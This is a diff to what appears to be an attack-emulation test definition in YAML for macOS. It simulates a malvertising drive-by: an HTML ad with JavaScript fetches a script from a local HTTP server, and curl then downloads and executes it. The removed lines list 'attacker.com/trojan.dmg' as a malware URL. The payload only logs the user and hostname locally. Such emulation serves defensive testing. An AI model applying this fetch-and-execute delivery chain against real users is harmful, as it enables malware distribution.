@@ -5,7 +5,9 @@ name: Malvertising Campaign
 authors:
 - TTPs Generator
 description: |
-  Simulate malvertising campaign using malicious advertisements to distribute malware
+  Demonstrate a malvertising-based drive-by compromise by creating malicious HTML content
+  with embedded JavaScript, serving it via a local HTTP server, and using curl to fetch the
+  page (representing an ad impression) to trigger payload delivery on macOS.
 mitre:
   tactics:
   - TA0001 Initial Access
@@ -15,47 +17,87 @@ requirements:
   platforms:
   - os: darwin
 args:
-- name: advertising_network
-  description: Ad network being abused for malvertising
-  type: string
-  default: google-ads
-- name: malware_url
-  description: URL hosting malware payload
-  type: string
-  default: http://attacker.com/trojan.dmg
-- name: target_website
-  description: Legitimate website displaying malicious ads
-  type: string
-  default: news.example.com
-- name: ad_type
-  description: Type of malicious advertisement (banner, popup, video)
-  type: string
-  default: banner
-- name: payload_type
-  description: Type of malware payload (trojan, backdoor, ransomware)
-  type: string
-  default: trojan
+- name: listen_port
+  description: Port for the local HTTP server serving malicious ads
+  type: int
+  default: 8890
 steps:
-- name: Identify ad network
-  description: Identify the advertising network being compromised
-  inline: 'echo "Compromised ad network: ${advertising_network}" > /tmp/malvertising.log'
-- name: Create malicious advertisement
-  description: Create malicious advertisement content
-  inline: echo "<ad type=\"${ad_type}\" src=\"${malware_url}\">Malicious Ad</ad>" > /tmp/malicious_ad.html && echo "Malicious
-    ad created" >> /tmp/malvertising.log
-- name: Inject ad into network
-  description: Simulate injecting malicious ad into advertising network
-  inline: echo "Injected ${ad_type} ad into ${advertising_network}" >> /tmp/malvertising.log
-- name: Deploy to target websites
-  description: Simulate deploying ad to target websites
-  inline: echo "Deployed to ${target_website} at $(date)" >> /tmp/malvertising.log
-- name: Monitor ad impressions
-  description: Monitor users clicking on malicious ad
-  inline: 'echo "Ad impressions: $(shuf -i 1000-5000 -n 1) | Clicks: $(shuf -i 100-500 -n 1)" >> /tmp/malvertising.log'
+- name: Create malicious ad content
+  description: Create HTML content with embedded JavaScript representing a malicious advertisement
+  inline: |
+    mkdir -p /tmp/malvert_server
+    cat > /tmp/malvert_server/ad.html <<'HTMLEOF'
+    <html>
+    <head><title>Advertisement</title></head>
+    <body>
+    <div id="ad-banner" style="width:728px;height:90px;background:#eee;">
+    <script>
+    // Malicious JavaScript in ad creative
+    var xhr = new XMLHttpRequest();
+    xhr.open("GET", "/exploit.sh", true);
+    xhr.onload = function() {
+      var payload = xhr.responseText;
+      // Payload execution triggered via ad creative
+      document.getElementById("ad-banner").innerHTML = "<p>Ad Loaded</p>";
+    };
+    xhr.send();
+    </script>
+    <noscript><img src="tracking.gif" width="1" height="1"></noscript>
+    </div>
+    </body>
+    </html>
+    HTMLEOF
+    cat > /tmp/malvert_server/exploit.sh <<'EXPLOITEOF'
+    #!/bin/bash
+    echo "Malvertising payload executed at $(date)" > /tmp/malvert_execution.log
+    echo "User: $(whoami)" >> /tmp/malvert_execution.log
+    echo "Hostname: $(hostname)" >> /tmp/malvert_execution.log
+    EXPLOITEOF
+    chmod +x /tmp/malvert_server/exploit.sh
+    echo "Malicious ad content created in /tmp/malvert_server/"
+- name: Start ad-serving HTTP server
+  description: Start a local HTTP server to serve the malicious ad content
+  inline: |
+    cd /tmp/malvert_server && python3 -m http.server {{ .Args.listen_port }} &>/tmp/malvert_server.log &
+    SERVER_PID=$!
+    echo $SERVER_PID > /tmp/malvert_server.pid
+    sleep 2
+    echo "Ad server started on port {{ .Args.listen_port }} (PID: $SERVER_PID)"
+- name: Fetch malicious ad page
+  description: Use curl to fetch the malicious ad page representing a user receiving an ad impression
+  inline: |
+    echo "=== Ad impression - fetching ad page ==="
+    curl -s http://127.0.0.1:{{ .Args.listen_port }}/ad.html
+    echo ""
+- name: Download exploit payload from ad
+  description: Download the exploit payload that would be triggered by the malicious ad JavaScript
+  inline: |
+    echo "=== Downloading exploit payload ==="
+    curl -s -o /tmp/malvert_exploit.sh http://127.0.0.1:{{ .Args.listen_port }}/exploit.sh
+    chmod +x /tmp/malvert_exploit.sh
+    echo "Exploit payload downloaded"
+    cat /tmp/malvert_exploit.sh
+- name: Execute exploit payload
+  description: Execute the exploit payload delivered through the malicious advertisement
+  inline: |
+    /tmp/malvert_exploit.sh
+    echo "=== Execution results ==="
+    cat /tmp/malvert_execution.log
+- name: Verify via HTTP server logs
+  description: Check the HTTP server access logs to verify payload delivery
+  inline: |
+    echo "=== HTTP Server Logs ==="
+    cat /tmp/malvert_server.log 2>/dev/null | tail -20
   cleanup:
-    inline: |-
-      rm -f /tmp/malicious_ad.html
-      rm -f /tmp/malvertising.log
+    inline: |
+      if [ -f /tmp/malvert_server.pid ]; then
+        kill $(cat /tmp/malvert_server.pid) 2>/dev/null || true
+        rm -f /tmp/malvert_server.pid
+      fi
+      rm -f /tmp/malvert_exploit.sh
+      rm -f /tmp/malvert_execution.log
+      rm -f /tmp/malvert_server.log
+      rm -rf /tmp/malvert_server
 tests:
 - name: dry_run_test
   dry_run: true
